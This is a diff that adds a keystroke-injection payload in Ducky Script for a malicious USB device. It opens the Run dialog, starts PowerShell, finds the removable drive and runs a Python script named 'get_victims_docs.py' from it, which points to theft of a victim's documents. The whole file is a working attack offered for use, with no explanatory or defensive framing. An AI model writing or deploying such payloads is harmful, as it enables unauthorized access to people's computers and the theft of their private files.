@@ -1,0 +1,12 @@
+DELAY 1000
+
+GUI r
+DELAY 500
+
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Find the removable drive letter and execute the script directly from the c drive
+STRING $usb = (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'}).DriveLetter; python "$usb`:\get_victims_docs.py"
+ENTER
